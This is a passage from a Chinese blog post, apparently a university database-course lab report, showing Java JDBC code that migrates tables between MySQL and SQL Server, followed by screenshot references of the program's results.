class="hljs-string">&quot;成功获取MySQL数据库的表&quot;</span>);<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 用于向Sql Server数据库单个表插入元组</span><br><span class="hljs-comment">     * table  表名  size 字段个数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">insertTable</span><span class="hljs-params">(String table,<span class="hljs-type">int</span> size)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            pstatMySql=connMysql.prepareStatement(<span class="hljs-string">&quot;select * from &quot;</span>+table);<br>            ResultSet rs=pstatMySql.executeQuery();<br>            <span class="hljs-comment">//分隔符</span><br>            String separator=<span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-comment">//插入元组的sql语句</span><br>            String insertSql=<span class="hljs-string">&quot;insert into &quot;</span>+table+<span class="hljs-string">&quot; values(&quot;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                insertSql+=(separator+<span class="hljs-string">&quot;?&quot;</span>);<br>                separator=<span class="hljs-string">&quot;,&quot;</span>;<br>            &#125;<br>            insertSql+=<span class="hljs-string">&quot;)&quot;</span>;<br>            <span class="hljs-comment">//关闭自动提交，使插入字段的语句为一个事务组</span><br>            connSQLserver.setAutoCommit(<span class="hljs-literal">false</span>);<br>            <span class="hljs-comment">//定义预编译的sql语句对象</span><br>            pstatSqlServer=connSQLserver.prepareStatement(insertSql);<br><br>            <span class="hljs-keyword">while</span> (rs.next())&#123;<br>                <span class="hljs-comment">//将字段值填入insertSql语句</span><br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                    pstatSqlServer.setObject(i+<span class="hljs-number">1</span>,rs.getObject(i+<span class="hljs-number">1</span>));<br>                &#125;<br>                <span class="hljs-comment">//加入批处理队列</span><br>                pstatSqlServer.addBatch();<br>            &#125;<br>            <span class="hljs-comment">//批量更新sql语句</span><br>            pstatSqlServer.executeBatch();<br>            <span class="hljs-comment">//提交</span><br>            connSQLserver.commit();<br>            <span class="hljs-comment">//恢复自动提交</span><br>            connSQLserver.setAutoCommit(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 建表并转移数据</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">convert</span><span class="hljs-params">(List&lt;String&gt; TableList)</span>&#123;<br>        <span class="hljs-comment">//结果集元数据</span><br>        <span class="hljs-type">ResultSetMetaData</span> <span class="hljs-variable">rsmd</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//获取MySQL数据库的所有表</span><br>        List&lt;String&gt; list=getTable(TableList);<br>        System.out.println(list.size());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; list.size(); i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;开始转移第&quot;</span> + (i + <span class="hljs-number">1</span> )+ <span class="hljs-string">&quot;数据表...&quot;</span>);<br>            <span class="hljs-comment">//查询表</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from &quot;</span> + list.get(i);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                pstatMySql = connMysql.prepareStatement(sql);<br>                <span class="hljs-comment">//获取数据表</span><br>                rsmd = pstatMySql.getMetaData();<br>                <span class="hljs-comment">//创建表的语句</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">createSql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;create table &quot;</span> + list.get(i) + <span class="hljs-string">&quot;(&quot;</span>;<br>                <span class="hljs-comment">//sql语句中字段名的分隔符</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">separator</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-comment">//遍历表中所有字段</span><br>                size = rsmd.getColumnCount();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; size; j++) &#123;<br>                    <span class="hljs-comment">//字段名 类型</span><br>                    createSql += separator + rsmd.getColumnName(j + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;  &quot;</span> + rsmd.getColumnTypeName(j + <span class="hljs-number">1</span>);<br>                    <span class="hljs-comment">//判断类型是否规定长度;注意默认INT类型长度为10</span><br>                    <span class="hljs-keyword">if</span> (rsmd.getPrecision(j + <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>&amp;&amp;rsmd.getColumnTypeName(j + <span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;INT&quot;</span>) &#123;<br>                        <span class="hljs-comment">//不为0或INT则规定长度</span><br>                        createSql += <span class="hljs-string">&quot;(&quot;</span> + rsmd.getPrecision(j + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;)&quot;</span>;<br>                    &#125;<br>                    separator = <span class="hljs-string">&quot;,&quot;</span>;<br>                &#125;<br>                createSql += <span class="hljs-string">&quot;);&quot;</span>;<br>                <span class="hljs-comment">//执行建表语句</span><br>                pstatSqlServer=connSQLserver.prepareStatement(createSql);<br>                pstatSqlServer.execute();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;开始向(&quot;</span> + list.get(i) + <span class="hljs-string">&quot;)数据表添加数据...&quot;</span>);<br>            <span class="hljs-comment">// 添加数据到建好的表中</span><br>            <span class="hljs-keyword">if</span> (insertTable( list.get(i), size))&#123;<br>                System.out.println(<span class="hljs-string">&quot;第&quot;</span> + (i + <span class="hljs-number">1</span> ) + <span class="hljs-string">&quot;个数据表数据转移成功&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;第&quot;</span> + (i + <span class="hljs-number">1</span> ) + <span class="hljs-string">&quot;个数据表数据转移失败&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="主函数类"><a href="#主函数类" class="headerlink" title="主函数类"></a>主函数类</h4><p>可与使用者交互，由使用者选择<code>功能</code>，并指定<code>源数据库</code>和<code>目的数据库</code>，动态修改连接数据库的配置文件<code>config.properties</code>成功与指定的数据库连接。然后由使用者可以指定需要转移的表，或者选择转移所有表，程序将执行<code>convert()</code>函数转移数据。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据输入的数据库名，更改properties文件的值</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">modifyConfig</span><span class="hljs-params">(String SqlServer_URL, String Mysql_URL)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/resources/config.properties&quot;</span>;<br>            <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>            properties.load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath));<br>            properties.setProperty(<span class="hljs-string">&quot;SqlServer_URL&quot;</span>, SqlServer_URL);<br>            properties.setProperty(<span class="hljs-string">&quot;Mysql_URL&quot;</span>, Mysql_URL);<br>            properties.store(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath), <span class="hljs-string">&quot;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 主函数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>));<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>            System.out.println(<span class="hljs-string">&quot;请选择功能：&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;1.从SqlServer转移数据至MySQL&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;2.从MySQL转移数据至SqlServer&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;其它: 退出程序&quot;</span>);<br>            <span class="hljs-comment">//操作</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.nextInt();<br>            <span class="hljs-keyword">if</span>(op!=<span class="hljs-number">1</span>&amp;&amp;op!=<span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">return</span>;<br>            System.out.println(<span class="hljs-string">&quot;请输入源数据库名：&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> in.next();<br>            System.out.println(<span class="hljs-string">&quot;请输入目的数据库名：&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">des</span> <span class="hljs-operator">=</span> in.next();<br>            List&lt;String&gt; TableList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            System.out.println(<span class="hljs-string">&quot;请要转移的表名：(以回车分隔，输入#结束; 若只输入#，则转移所有表)&quot;</span>);<br>            String TableName;<br>            <span class="hljs-keyword">do</span><br>            &#123;<br>              TableName= in.next();<br>              <span class="hljs-comment">// 若不是终止符,则加入</span><br>              <span class="hljs-keyword">if</span>(!TableName.equals(<span class="hljs-string">&quot;#&quot;</span>))<br>              &#123;<br>                  TableList.add(TableName);<br>              &#125;<br>              <span class="hljs-keyword">else</span><br>              &#123;<br>                  <span class="hljs-keyword">break</span>;<br>              &#125;<br>            &#125;<span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">SqlServer_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:sqlserver://127.0.0.1:1433;DatabaseName=&quot;</span> + src;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">Mysql_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/&quot;</span> + des;<br>                <span class="hljs-comment">//修改配置</span><br>                modifyConfig(SqlServer_URL, Mysql_URL);<br>                <span class="hljs-comment">//连接数据库</span><br>                <span class="hljs-type">SqlServerConnection</span> <span class="hljs-variable">SqlServerConn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlServerConnection</span>();<br>                <span class="hljs-type">MysqlConnection</span> <span class="hljs-variable">MysqlConn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MysqlConnection</span>();<br>                SqlServerConn.connect();<br>                MysqlConn.connect();<br>                SqlServerToMysql.setConnSQLserver(SqlServerConn.getConnection());<br>                SqlServerToMysql.setConnMysql(MysqlConn.getConnection());<br>                System.out.println(<span class="hljs-string">&quot;开始转移数据&quot;</span>);<br>                <span class="hljs-comment">//计时</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>                <span class="hljs-comment">//转移数据库</span><br>                SqlServerToMysql.convert(TableList);<br>                System.out.println(<span class="hljs-string">&quot;迁移完毕,耗时:&quot;</span>+(System.currentTimeMillis()-start)+<span class="hljs-string">&quot;ms&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op==<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">SqlServer_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:sqlserver://127.0.0.1:1433;DatabaseName=&quot;</span> + des;<br>                <span class="hljs-comment">//nullCatalogMeansCurrent=true 使getTable使返回指定数据库的表的信息</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">Mysql_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/&quot;</span> + src+<span class="hljs-string">&quot;?nullCatalogMeansCurrent=true&quot;</span>;<br>                <span class="hljs-comment">//修改配置</span><br>                modifyConfig(SqlServer_URL, Mysql_URL);<br>                <span class="hljs-comment">//连接数据库</span><br>                <span class="hljs-type">SqlServerConnection</span> <span class="hljs-variable">SqlServerConn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlServerConnection</span>();<br>                <span class="hljs-type">MysqlConnection</span> <span class="hljs-variable">MysqlConn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MysqlConnection</span>();<br>                SqlServerConn.connect();<br>                MysqlConn.connect();<br>                MysqlToSqlServer.setConnSQLserver(SqlServerConn.getConnection());<br>                MysqlToSqlServer.setConnMysql(MysqlConn.getConnection());<br>                System.out.println(<span class="hljs-string">&quot;开始转移数据&quot;</span>);<br>                <span class="hljs-comment">//计时</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>                <span class="hljs-comment">//转移数据库</span><br>                MysqlToSqlServer.convert(TableList);<br>                System.out.println(<span class="hljs-string">&quot;迁移完毕,耗时:&quot;</span>+(System.currentTimeMillis()-start)+<span class="hljs-string">&quot;ms&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="5-实验效果"><a href="#5-实验效果" class="headerlink" title="5 实验效果"></a>5 实验效果</h2><h3 id="由-SQL-Server-转移数据至-MySQL-1"><a href="#由-SQL-Server-转移数据至-MySQL-1" class="headerlink" title="由 SQL Server 转移数据至 MySQL"></a>由 SQL Server 转移数据至 MySQL</h3><h4 id="转移指定的表"><a href="#转移指定的表" class="headerlink" title="转移指定的表"></a>转移指定的表</h4><ul><li><p>SQL Server数据库的<code>test</code>中有表<code>student</code>,<code>course</code></p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184525491.png" alt="image-20220521184525491"> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184627654.png" alt="image-20220521184627654">  <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184654364.png" alt="image-20220521184654364"></p></li><li><p>指定转移<code>course</code>表，则执行程序：</p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521194512964.png" alt="image-20220521194512964"></p></li><li><p>MySQL产生这一个表：</p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184457197.png" alt="image-20220521184457197">  <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184509328.png" alt="image-20220521184509328"></p></li></ul><h4 id="转移所有表"><a href="#转移所有表" class="headerlink" title="转移所有表"></a>转移所有表</h4><ul><li><p>SQL Server数据库的<code>test</code>中有表<code>student</code>,<code>course</code></p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184525491.png" alt="image-20220521184525491"> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184627654.png" alt="image-20220521184627654">  <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184654364.png" alt="image-20220521184654364"></p></li><li><p>执行程序：</p><p> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521193707466.png" alt="image-20220521193707466"></p></li><li><p>MySQL产生这两个表：</p><p> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521185003182.png" alt="image-20220521185003182"> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184927043.png" alt="image-20220521184927043">  <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521184943789.png" alt="image-20220521184943789"></p></li></ul><h3 id="由-MySQL-转移数据至-SQL-Server-1"><a href="#由-MySQL-转移数据至-SQL-Server-1" class="headerlink" title="由 MySQL 转移数据至 SQL Server"></a>由 MySQL 转移数据至 SQL Server</h3><h4 id="转移指定的表-1"><a href="#转移指定的表-1" class="headerlink" title="转移指定的表"></a>转移指定的表</h4><ul><li><p>MySQL数据库的<code>test</code>中有表<code>student</code>,<code>teacher</code></p></li><li><p>指定转移<code>student</code>表，则执行程序：</p><p> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521194249290.png" alt="image-20220521194249290"></p></li><li><p>SQL Server产生这一个表：</p><p> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521183307710.png" alt="image-20220521183307710"><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521183249389.png" alt="image-20220521183249389"> </p></li></ul><h4 id="转移所有表-1"><a href="#转移所有表-1" class="headerlink" title="转移所有表"></a>转移所有表</h4><ul><li><p>MySQL数据库的<code>test</code>中有表<code>student</code>,<code>teacher</code></p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521182414504.png" alt="image-20220521182414504">  <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521182446725.png" alt="image-20220521182446725"> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521182510012.png" alt="image-20220521182510012"></p></li><li><p>执行程序：</p><p> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521194119166.png" alt="image-20220521194119166"></p></li><li><p>SQL Server产生这两个表：</p><p> <img 